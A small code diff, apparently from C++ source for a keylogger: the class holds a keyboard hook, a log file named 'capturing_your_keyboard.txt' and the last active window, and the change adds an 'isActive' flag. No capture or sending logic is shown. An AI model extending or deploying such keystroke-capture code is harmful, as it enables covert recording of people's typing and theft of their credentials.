@@ -24,6 +24,7 @@ public:
 private:
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	shared_ptr<Hook> hook;
+	bool isActive;
 	ofstream logFile;
 	HWND lastActiveWindow;
 
